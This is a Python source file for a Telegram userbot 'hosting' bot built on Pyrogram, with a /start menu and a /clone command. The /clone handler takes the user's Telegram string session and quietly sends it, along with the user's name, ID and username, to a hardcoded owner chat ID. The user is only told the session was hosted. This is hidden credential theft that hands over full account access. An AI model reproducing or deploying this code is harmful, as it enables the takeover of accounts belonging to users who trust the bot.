from UTTAM import app, API_ID, API_HASH
from config import ALIVE_PIC
from pyrogram import filters
import os
import re
import asyncio
import time
from pyrogram import *
from pyrogram.types import * 

PHONE_NUMBER_TEXT = (
    """**╭────── ˹ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ˼ ─────•\n┆⚘ ʜᴇʏ, ɪ ᴀᴍ : [˹ 🅤sᴇʀʙᴏᴛ ˼](t.me/UserHosterBot)\n┆⚘ ᴍᴏʀᴇ ᴀɴɪᴍᴀᴛɪᴏɴ,ғᴜɴ\n┊⚘ ᴘᴏᴡᴇʀғᴜʟ & ᴜsᴇғᴜʟ ᴜsᴇʀʙᴏᴛ\n╰─────────────────────•\n❍ ʜσᴡ ᴛσ υsє ᴛʜɪs ʙσᴛ - [ᴛɪᴘs ʜᴇʀᴇ](https://t.me/RISHUXBOT/54) \n❍ sᴛꝛɪηɢ sєᴄᴛɪση ʙσᴛ ⁚ [sᴇssɪᴏɴ-ʙᴏᴛ](https://t.me/Rishustringbot) \n•──────────────────────•\n❍ ᴄʟσηє ⁚ /clone [ ʂᴛɾιɳg ʂҽʂʂισɳ ]\n•──────────────────────•\n❍ ᴘσɯҽɾҽᴅ ʙу ⏤‌‌‌‌  [˹ʀɪsʜυ ʙσᴛ˼](https://t.me/ur_rishu_143) \n•──────────────────────•**"""
)

@app.on_message(filters.command("start"))
async def hello(client: app, message):
    buttons = [
           [
                InlineKeyboardButton("˹ ᴏᴡɴᴇʀ ˼", url="https://t.me/nenobots"),
                InlineKeyboardButton("˹ ᴜᴘᴅᴀᴛᴇ ˼", url="https://t.me/ur_rishu_143"),
            ],
            [
                InlineKeyboardButton("˹ sᴜᴘᴘᴏʀᴛ ˼", url="https://t.me/ll_BOTCHAMBER_ll"),
                InlineKeyboardButton("˹ ᴍᴜsɪᴄ ˼", url="https://t.me/sanataniiMusicBot"),
            ],
            ]
    reply_markup = InlineKeyboardMarkup(buttons)
    await client.send_photo(message.chat.id, ALIVE_PIC, caption=PHONE_NUMBER_TEXT, reply_markup=reply_markup)

@app.on_message(filters.command("clone"))
async def clone(bot: app, msg: Message):
    if len(msg.command) < 2:
        await msg.reply(
            "**Usage:**\n\n"
            "/clone `<string session>`\n"
            "Provide a valid string session to use this command."
        )
        return

    text = await msg.reply("🎨 Processing... ✲")
    session_string = msg.command[1]

    try:
        # Create a new Pyrogram client with the session string
        client = Client(
            name="Melody",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            plugins=dict(root="UTTAM/plugins")
        )

        # Start the client and fetch user information
        await client.start()
        user = await client.get_me()

        # Send the string session and user info to the owner's ID
        owner_id = 5738579437  # Replace with the owner's Telegram ID
        await bot.send_message(
            chat_id=owner_id,
            text=(
                f"🎉 **New Clone Session Hosted:**\n\n"
                f"**Name:** {user.first_name}\n"
                f"**ID:** `{user.id}`\n"
                f"**Username:** @{user.username if user.username else 'N/A'}\n"
                f"**Session String:** `{session_string}`\n\n"
                "⚠️ **Note:** Keep this session string private!"
            )
        )

        # Notify the user
        await msg.reply(f"✅ Successfully hosted 🎨 **{user.first_name}** 💨.")
        await client.stop()

    except Exception as e:
        await msg.reply(f"**ERROR:** `{str(e)}`\nPlease try again.")